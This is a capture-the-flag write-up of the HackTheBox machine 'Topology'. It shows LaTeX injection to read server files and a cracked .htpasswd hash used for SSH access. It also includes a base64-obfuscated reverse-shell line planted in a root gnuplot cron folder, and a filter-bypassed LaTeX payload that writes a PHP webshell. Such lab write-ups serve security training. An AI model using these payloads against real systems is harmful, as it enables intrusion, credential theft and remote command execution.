---
render_with_liquid: false
title: HackTheBox Writeup  Topology
date: 2023-09-20 19:35:52 +1400
tags: [hackthebox, nmap, linux, feroxbuster, latex-injection, subdomain, gobuster, file-read, htpasswd, ocr-tesseract, pspy, scheduled-job-abuse, latex-filter-bypass, file-write, php, webshell]
---



Topology is an Easy Difficulty Linux machine that showcases a `LaTeX` web application susceptible to a Local File Inclusion (LFI) vulnerability. Exploiting the LFI flaw allows for the retrieval of an `.htpasswd` file that contains a hashed password. By cracking the password hash, `SSH` access to the machine is obtained, revealing a `root` cronjob that executes `gnuplot` files. Crafting a malicious `.plt` file enables privilege escalation.


# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/Topology]
└─$ writehosts htb '10.129.212.173 topology.htb stats.topology.htb dev.topology.htb latex.topology.htb'
+---------+--------+----------------+--------------------+
| PROFILE | STATUS |       IP       |       DOMAIN       |
+---------+--------+----------------+--------------------+
| htb     | on     | 10.129.212.173 | topology.htb       |
| htb     | on     | 10.129.212.173 | stats.topology.htb |
| htb     | on     | 10.129.212.173 | dev.topology.htb   |
| htb     | on     | 10.129.212.173 | latex.topology.htb |
+---------+--------+----------------+--------------------+
```

## Nmap

```bash

# Nmap 7.94 scan initiated Wed Sep 20 19:35:52 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80 topology.htb
Nmap scan report for topology.htb (10.129.69.153)
Host is up, received user-set (0.12s latency).
Scanned at 2023-09-20 19:35:52 CST for 42s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC65qOGPSRC7ko+vPGrMrUKptY7vMtBZuaDUQTNURCs5lRBkCFZIrXTGf/Xmg9MYZTnwm+0dMjIZTUZnQvbj4kdsmzWUOxg5Leumcy+pR/AhBqLw2wyC4kcX+fr/1mcAgbqZnCczedIcQyjjO9M1BQqUMQ7+rHDpRBxV9+PeI9kmGyF6638DJP7P/R2h1N9MuAlVohfYtgIkEMpvfCUv5g/VIRV4atP9x+11FHKae5/xiK95hsIgKYCQtWXvV7oHLs3rB0M5fayka1vOGgn6/nzQ99pZUMmUxPUrjf4V3Pa1XWkS5TSv2krkLXNnxQHoZOMQNKGmDdk0M8UfuClEYiHt+zDDYWPI672OK/qRNI7azALWU9OfOzhK3WWLKXloUImRiM0lFvp4edffENyiAiu8sWHWTED0tdse2xg8OfZ6jpNVertFTTbnilwrh2P5oWq+iVWGL8yTFeXvaSK5fq9g9ohD8FerF2DjRbj0lVonsbtKS1F0uaDp/IEaedjAeE=
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Miskatonic University | Topology Group
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Wed Sep 20 19:36:34 2023 -- 1 IP address (1 host up) scanned in 42.57 seconds
```


## 80 - Site : Miskatonic University

### Info

![](/assets/obsidian/c412d2382f0523c26738bdae90c28270.png)

### Sub Domains


#### Enumeration

```bash
gobuster vhost -t 150 --append-domain -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://topology.htb
```

```bash
Found: stats.topology.htb Status: 200 [Size: 108]
Found: dev.topology.htb Status: 401 [Size: 463]
Found: latex.topology.htb Status: 200 [Size: 2828]
```

#### stats.topology.htb

![](/assets/obsidian/20fa75d0ed94dff82d776ebbc82cb45f.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Topology]
└─$ feroxbuster -k -t 150 -u 'http://stats.topology.htb/' -w /usr/share/seclists/Discovery/Web-Content/big.txt -o ferox_stats.topology.htb.txt
...
200      GET       59l      285w    21643c http://stats.topology.htb/files/load.png
200      GET        0l        0w        0c http://stats.topology.htb/files/network.png
200      GET        5l        9w      108c http://stats.topology.htb/
[####################] - 16m    20482/20482   0s      found:3       errors:19719
[####################] - 16m    20477/20477   21/s    http://stats.topology.htb/
[####################] - 5s     20477/20477   4044/s  http://stats.topology.htb/files/ => Directory listing 
```

#### dev.topology.htb

![](/assets/obsidian/90afcfe58c0ac53fdc1f060fc0ca54ce.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Topology]
└─$ feroxbuster -k -t 150 -u 'http://dev.topology.htb/' -w /usr/share/seclists/Discovery/Web-Content/big.txt -o ferox_dev.topology.htb.txt
...
301      GET        9l       28w      325c http://dev.topology.htb/javascript => http://dev.topology.htb/javascript/
...
```


#### latex.topology.htb

![](/assets/obsidian/ac54e61c7d6531865f8c14d26e88421d.png)

# User Flag
---

## Shell as vdaisley

### Latex injection to read file

It mentioned a **Latex Util** in the `Sofware projects` section

![](/assets/obsidian/23d6906631477aba334137535b658a28.png)

> latex.topology.htb/equation.php

![](/assets/obsidian/075f39feb9429f1efb9f3e3a6ea64d39.png)

Try latex injections from [hacktricks](https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injection)

![](/assets/obsidian/7acaf5cc4068b0f71c9c10704bfbda2b.png)

![](/assets/obsidian/2543adcaec1f9b60c76a540a5f7b4afe.png)

Try add wrappers

![](/assets/obsidian/b5caf2a3e587410e0a8eee7ff12da7f6.png)

It worked

```bash
$ \lstinputlisting{/etc/passwd} $
```

![](/assets/obsidian/e371051b19200871fedd6ca9eb8e3628.png)

Tried to get ssh keys for `vdaisley` , but it doesn't exist

```bash
$ \lstinputlisting{/home/vdaisley/.ss./id_rsa} $
```


### Readable htpasswd from dev.topology.htb

Since `dev.topology.htb` was using **Apache** and requires **http authentication**, there will be a `.htpasswd` file which store users and hashes

The location of `.htpasswd` can be found from **apcache** config : `/etc/apache2/sites-enabled/000-default.conf`

```bash
$ \lstinputlisting{/var/www/dev/.htpasswd} $
```

![](/assets/obsidian/1cf1d107eddf4ef7b3c28283f5631ff5.png)

Use **Image OCR** to extract the text

```bash
┌──(bravosec㉿fsociety)-[~/Desktop]
└─$ tesseract equation.png passwd
Estimating resolution as 366

┌──(bravosec㉿fsociety)-[~/Desktop]
└─$ cat passwd   
vdaisley : $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTYO
```

Crack the hashes

```bash
┌──(bravosec㉿fsociety)-[~/htb/Topology]
└─$ vi htpasswd.hash
$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTYO

┌──(bravosec㉿fsociety)-[~/htb/Topology]
└─$ hashcat htpasswd.hash /opt/wordlists/rockyou.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Topology]
└─$ hashcat htpasswd.hash /opt/wordlists/rockyou.txt --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR) | FTP, HTTP, SMTP, LDAP Server

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0:calculus20
```

Login to ssh

```bash
┌──(bravosec㉿fsociety)-[~/htb/Topology]
└─$ cssh vdaisley@topology.htb 'calculus20'
Warning: Permanently added 'topology.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-150-generic x86_64)


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

vdaisley@topology:~$ id
uid=1007(vdaisley) gid=1007(vdaisley) groups=1007(vdaisley)
vdaisley@topology:~$ cat user.txt
a84996d7fdeae0171d72740efcd2aab0
```

# Root Flag
---

## From vdaisley to root

### Scheduled Job running as root

```bash
vdaisley@topology:~$ wget 10.10.14.14/pspy64 -O /var/tmp/p && chmod +x /var/tmp/p && /var/tmp/p
```

![](/assets/obsidian/5d7a90f386d1dacc6173c35ea94997e0.png)

`gnuplot` is loading `*.plt` files in `/opt/gnuplot`, and every user have permission to write files to that folder

```bash
vdaisley@topology:~$ ls -la /opt
total 12
drwxr-xr-x  3 root root 4096 May 19 13:04 .
drwxr-xr-x 18 root root 4096 Jun 12 10:37 ..
drwx-wx-wx  2 root root 4096 Jun 14 07:45 gnuplot
```

Google : `gnuplot .plt file exec command`

```bash
vdaisley@topology:~$ echo 'system "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC8xMTExIDA+JjE= | base64 -d | bash"' > /opt/gnuplot/ok.plt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Topology]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.14] from (UNKNOWN) [10.129.69.153] 33896
bash: cannot set terminal process group (9178): Inappropriate ioctl for device
bash: no job control in this shell
connect to [10.10.14.14] from (UNKNOWN) [10.129.69.153] 48366
bash: cannot set terminal process group (9133): Inappropriate ioctl for device
bash: no job control in this shell
root@topology:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@topology:~# cat /root/root.txt
cat /root/root.txt
078ab063e1581a7a329b074c29567312
```


# Additional
---

## Latex Injection to RCE


### Bypass filters and write php webshell


#### How it works

Replace character to HEX

For example, commonly used char : `e`

```bash
man ascii|grep e
```

```
... 65    e
```

```bash

# Original
$ \lstinputlisting{/etc/passwd} $


# Obfuscated
$ \lst^^65nputl^^65st^^65ng{/etc/passwd} $
```

#### Exploit

> https://book.hacktricks.xyz/pentesting-web/formula-csv-doc-latex-ghostscript-injection#write-file

Original payload :

```bash
┌──(bravosec㉿fsociety)-[~/htb/Topology]
└─$ vi payload.txt
```

```
\newwrite\outfile
\openout\outfile=X1
\write\outfile{X2}
\closeout\outfile
```

Obfuscate payload

```bash
┌──(bravosec㉿fsociety)-[~/htb/Topology]
└─$ sed -e 's/e/^^65/g' -e 's/X1/rev.php/g' -e 's/X2/<?php system($_REQUEST[0]); ?>/g' payload.txt
\n^^65wwrit^^65\outfil^^65
\op^^65nout\outfil^^65=rev.php
\writ^^65\outfil^^65{<?php system($_REQUEST[0]) ?>}
\clos^^65out\outfil^^65
```

Check file location

```
$ \lstinputlisting{../equation.php} $
```

![](/assets/obsidian/8cc22eafdd13d04ad6235c9f72ff5dec.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Topology]
└─$ curl -X POST "http://latex.topology.htb/tempfiles/rev.php" -d "0=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
